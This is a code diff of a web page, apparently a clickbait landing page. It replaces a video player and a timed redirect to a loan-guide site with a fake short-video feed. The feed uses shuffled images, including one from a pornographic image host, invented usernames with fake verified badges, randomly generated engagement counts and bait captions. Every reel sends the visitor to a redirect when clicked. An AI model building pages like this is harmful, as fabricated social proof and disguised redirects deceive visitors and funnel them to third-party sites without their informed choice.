+  "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK2lblPIawz1rWH76drZ-yGSaRf284uePJRKSeV_2Z_RQYImEiWez8jkj05gV7Ijin21edVy6B3T6gwgtdn4bORDW-qKzVuPahTOnAz3BJ1-WHMvvUo1HJuqfmfNVkbVGBYFjGUAec43O1KJFEr0ust4YZki4IxHcr6ZTZcc6gA21T5Pcvy2a8Vm8sHkTe/s1300/image_14-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhegkBaX6ySaqT-iqx1XK9Vu6k5_ThRZtKkff1n6QAtNnFqez-ZdWyCI3x_tAXQ6EzPXuAeB5YQVkrKey0k3ckto0GMXe9fNP_2Nj4fZnMsRZ32IhcMC8HxG0YJeCcaL8nZoZt947KZcRdLeek_321Bp8VOW_3YcfA46iBs4vaF6uezSZAqOZ5O8DjHZ3yc/s1300/image_13-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5w8341gA84VDFR-WHQs_kTCHjkyw8ffEnXNgAp2t6qLn5XJPczRFXkWR2qwsxkjP9483J6ELybkF_SFzHMC8ava2ck866zUFPZZu8zuRLsO9GF3HKALG8PAs8MXFjvOdi-hcG27xtur0VLnqgHiXffMOj9QZkgDu9h_9Qkq2rnxGMg7TItAfOzTsWPDLN/s1200/image_12-30kb.webp",
+  "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUIlgjJwT98f0UghQYXgdHrihFcSC1TTRLyfd_mxcQ1Xv2yMR53iUBYyCmsNhobTk4uI6MhmdG8xTtxlc9r4ljE6u1XZ8QiPb5QZQ2G6EeaVazt-qGc7w1uBNkeKXdzb11iJzJhWa_O9f6zNmVX4D9E-D8gKf6PwkgDQMA7rLIi_5K9U2UaOQ7y8HsYUFD/s1300/image_11-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhsW6KWO8rpolH1QVc07m_IsJPHP27FLXL2edDc__4ZWq3XDNU7i3tbkz6G16O1buZHi-8VuVhcCwUmO60or3bVEtOXuubec18rRc6EkOd4_OepqVUSwRd50WH1xhcuMsCNBEXMbIIC544iqbNHWj17S1tfvK1Dkpo20j8AEGEgrxzQTjBrFfjeZh7Lwu7a/s1300/image_10-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhf90i_8YAr_RRIqKrAAuDWGs7AmV7da67VPeVw2t-dj_L5zQfyfgCxMVKoJ5sTAONv2yzWMn352dh-qRDQa57jy9kO2DSH-uSY0ycCjPcaQVOIMdW-UbF4w-ygQXP5ok-kpe063LYx-rGSAdRkJGWXAlVGhvWRj8YFSEsXWtXm15am840EqJxkBOd-4K54/s1300/image_09-30kb.webp",
+  "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxFShYmBlgz2-creZLhXqVADTHuG39nZ556SoCA8vTMiwiWdrJQLNYP6FtH8Gm-oD6GKkqxEJunZX4EANJINP5z_mausYxeBxqAjmqzUpNUlP94Ur48BUWMU6S7vWOirw0obhluscde4MIdX6WHSClgITL1gOUA1KYI9vOiPvY3zdI9M0DugV_ZOXE7Err/s1072/image_08-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7o7clxZXxcdKR3g4Vz9k7Vtx1uNR7LUTmkjBqL4b_JdOzJjTvc7Ls7KOb7cvdMILm5xzJqcKZZxJjaBLl7vd9FI_kD2sg47IaDryno96-L5WRru0dqV-iVe5kqjInsJcpissswMt0wTsn5lJ6EeHwYI6hqjJ_Vqd-uShapJxbM-6xvaCHjRGXQI9zIDJV/s1300/image_07-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYkzIz_99xUTiTKzLDxLmtKHn1jmWjjXdB9PgWm3_DRODHUi-ydDg5g4vCSip1fE4wvphENTamELskFNCLDE77QtoU3Xua3nwkxzeG0W1ZWtFnxedNZQj00UPfJ8meTOGqTeJ1x7wp41PzvbXjOskGsMVgVQuAAQVwCGwa2rXhS7qMYZJh_RufyUeiW03B/s1300/image_06-30kb.webp",
+  "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiD1wklbXF4zj-7b3BUmg5xpAeMi5La_Ed62RK5ox-FZftiGG-OxjUAacsXgNR4FjTNQ2_DVCwZCuJU8Z6MXXt84pVt02Do2LlTzoxw47ca2sxjodEUj-YeLOOlq9FXCDJ323zht0whR2S3Z9VQIEtiJ7g9wTZrjbjhtXmGg88bJzp8GBKPsrX4HLX6u9ZE/s1024/image_05-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQA2fFYy-7H7dxVcVWsdIbQEP3lTSv0dzTCzY34m7toCmUNTTPSv6NqcUhIPsC6Umwr3qqCGuAH9QWk2lcE9JsVD-h4FeLBiBIJBFeujg8jvNxw3dLtPX4ah81sLntimKOKWVjjd4Z_pIN0BD7IINnann7FFpO6yCphm9si9wm-BtnWnZwYdBCQmaTtzz6/s1300/image_04-30kb.webp","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNW11YnaYze-PcPrxJzoBrNqYOE1AUoH9-pMpFtRE4grsnyh8PT1W69XT29I372p0SWH1rdZbHagXYalOmugc38n3v_7SroYlvBnaSD1cz6E8AlaSM4pCL3EQHm8vQ0f3uD9N5NfHpI9trPwfBRUQqR2wkzJf8Ly5nQCn8oZzEItBL_HR9jBaZGsL45dwd/s1300/image_03-30kb.webp",
+  "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZn-qj5pcLVTyebnhd2PAE2HKuE6V-UTPQyLLFkvcq0pYvhj-8dEsKYQvdDN7InA3VToMyt4rYkEZTBESfAc_0N3u3jEuWRxqJq7p8AwMi7EVbea9fBm7x1rHC8tYooEzVPLoPlJjC65bNhb7rxhAX-EtTPtC313w_H_BgWZklgZPB1NBVbl0yihRuH-JR/s1300/image_02-30kb.webp","https://cdni.pornpics.com/460/3/36/65001727/65001727_016_fc02.jpg"
+];
 
-  }
+// Shuffle images
+for (let i = images.length - 1; i > 0; i--) {
+  const j = Math.floor(Math.random() * (i + 1));
+  [images[i], images[j]] = [images[j], images[i]];
+}
 
+const usernames = ["Sophia Lane","Emily Rose","Ava Grace","Mia Johnson","Zoe Sky","Chloe Stone"];
+const captions  = ["🔥 Hot trending video!","💃 Dance moves on fire!","😍 Don't scroll past this!","⚽ Epic goal moment!","🌄 Scenic mountain vibes!","🎸 Guitar solo madness!"];
+const profilePics = ["https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiU8SnApOSa5JZpAQa263-nZdLauGuXZqsYjtwbVCY7_jKcM5uit9FioYQrlBys37AIhVBvUABfG8af0htCSdtaJmu0wfVH6Z-JnGnZgv3lofk4C1NXugy7IA_gcTEwima-uiAEafE7GETDdjLwWWsp9mF9s4k4nxwp3DXkWd5MLfe9wON96EkNairrAKeQ/s128/6.jpg","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCEMS-gECxaBl5g4iVcey2ePW1qZ544Xv0KW0CZ0vl3MXdGMHckfS6xTLGt5-MSYL5K1jf9CxbCanx_8jqrK9iQHTADXbSJluregMmLFp7MKiydqvt5TzXn5oZlm1yIKoIe4b-1AUMnJE7UULtROXpObiVUGJxKBu6C6wIYLGDxRhgF3YWCYT9hhvJKl4N/s128/5.jpg","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh60Te2Mdtm8iyL92k3jrYTufjTuDq31Qmr_lVEte2EUx2227d_f_G-hpIdjNz99nxtAVh9E_XKjwi8sWfUzcl-NOSXCIgQ0XZ_iIpqxET_Sbwmc1lT1tCngW24QMx_1UXqd7es9daOO_dKg_5jb2PUWPp7D9KJKghM05gkFeHAIWWUxR07fu_vNQqOMk_A/s128/4.jpg","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFMExuEKh8pXEcORKm6XOkuBsr79oJ5JQ1n3Ctyz_wzYpPInOAYpudMNSq0JB7hn6qUIzmeCsbwGYJIuQXCQJ8ADuepO4iGUc3NqrELKvrNq88Ky66WiUpC3lclWEbKaVIzSqN3qS_bMGfgrZsnIXKh7wXThKl9Cw7gu3TUY897jY15k-6kRchsRbOnW8Y/s128/3.jpg","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgz-jMkX5TldL9GhS05wRBtKCMhUl1gd7F5IE3Z3SUrfVnua-0Ukvtbjuj1p0V3LceTfSC0rR9e6oDY7X7uvfPPfgAxPtMGx3-0JBtdd9AAhd2NVzKC5UYvD2tMNr3QdQVhclmugHMwNz-rykx_z3nT35F4hEvKOzWkZQyUCjJonkeF1_adWAASMh-mNLsw/s128/2.jpg","https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidIDVaUGMZTYtE7iM2XCYsCyHskqg9XXVOLnlXGAPCFEDWqQBObmUmBAx-bmMvi9y1PHnoMjfuvtshlXXRBmprBssXDWn7vqUoNf6b5jjmfEhzTjXE38Fsea-Uof3buOo_KgRX1-ns3YVYMvhX8CZYdN1dslb5BJrFcCDOABwKDuB4bbr8aDU01bOOmGEB/s128/1.jpg"];
 
-  if(controlVolume){
+function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function formatCount(n) { return n > 999 ? (n / 1000).toFixed(1) + 'K' : n; }
 
-    controlVolume.addEventListener(
-      "click",
-      toggleMute
-    );
+const reels = document.getElementById("reelsContainer");
 
-  }
+for (let i = 0; i < images.length; i++) {
+  const like    = formatCount(rand(1000, 95000));
+  const comment = formatCount(rand(80, 4500));
+  const share   = formatCount(rand(10, 2000));
+  const profile  = profilePics[i % profilePics.length];
+  const username = usernames[i % usernames.length];
+  const caption  = captions[i % captions.length];
+  const img      = images[i];
 
-
-  /* =========================================
-     PROGRESS BAR
-  ========================================= */
-
-  var progress =
-    document.getElementById("progress");
-
-  var progressFill =
-    document.querySelector(".progress-fill");
-
-
-  if(progress){
-
-    progress.addEventListener(
-      "click",
-      function(e){
-
-        var rect =
-          progress.getBoundingClientRect();
-
-        var percent =
-          (
-            (e.clientX - rect.left)
-            / rect.width
-          ) * 100;
-
-        percent =
-          Math.max(
-            0,
-            Math.min(100,percent)
-          );
-
-        progressFill.style.width =
-          percent + "%";
-
-      }
-    );
-
-  }
-
-
-  /* =========================================
-     FULLSCREEN
-  ========================================= */
-
-  var fullscreenButton =
-    document.getElementById("fullscreenButton");
-
-
-  if(fullscreenButton){
-
-    fullscreenButton.addEventListener(
-      "click",
-      function(){
-
-        player.classList.toggle(
-          "fullscreen"
-        );
-
-      }
-    );
-
-  }
-
-
-})();
-
+  const reel = document.createElement("div");
+  reel.className = "reel";
+  
+  // ভিডিও বা ফটোতে ক্লিক করলে রিডাইরেক্ট লজিক কাজ করবে
+  reel.onclick = () => executeRedirect();
+  
+  reel.innerHTML = `
+    <img src="${img}" alt="">
+    <div class="play-button"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_ArokwE-11idSfCUce_98fnJViyENMWaswE4v-fDg7mQgAulqTFS3JNpMlmqy_BCjs5_Ez5Onpz6mgc8AFy7_reX00Bbb2rrjwbkotcvn4SYppiK12ap9Yfsry8K7c1PJYyfZXfAy-eUZukjBAH7Gg6UYGK_ko_nCg6AwUQNQgcs8bhFQQlp3n2j42gle/s512/27223.png" alt="play"></div>
+    <div class="right-icons">
+      <div class="icon"><i class="fa-regular fa-thumbs-up"></i><span>${like}</span></div>
+      <div class="icon"><i class="fa-regular fa-comment"></i><span>${comment}</span></div>
+      <div class="icon"><i class="fa-solid fa-share"></i><span>${share}</span></div>
+    </div>
+    <div class="profile-section">
+      <div class="profile-ring"><img src="${profile}" alt=""></div>
+      <div class="username">
+        ${username}
+        <div class="verify-box"><i class="fa-solid fa-check"></i></div>
+      </div>
+      <button class="follow-btn">Follow</button>
+    </div>
+    <div class="caption">${caption}</div>
+  `;
+  reels.appendChild(reel);
+}
 </script>
-<script>
-setTimeout(function () {
-  window.location.href = "https://info.ajkerbanglatarikh.com/loan-guide/?utm_source=Facebook&utm_medium=Social&utm_campaign=parves";
-}, 3000);
-</script>
-</body>
-</html>
